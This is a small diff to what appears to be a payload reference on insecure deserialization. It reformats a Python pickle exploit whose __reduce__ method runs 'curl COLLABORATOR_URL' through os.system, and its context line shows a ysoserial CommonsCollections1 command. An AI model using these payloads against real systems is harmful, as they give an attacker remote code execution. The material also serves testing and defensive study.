@@ -50,9 +50,13 @@ java -jar ysoserial.jar CommonsCollections1 'curl COLLABORATOR_URL' | base64
 #### Python (pickle)
 ```python
 import pickle, os, base64
+
+
 class Exploit:
     def __reduce__(self):
-        return (os.system, ('curl COLLABORATOR_URL',))
+        return (os.system, ("curl COLLABORATOR_URL",))
+
+
 payload = base64.b64encode(pickle.dumps(Exploit()))
 ```
 
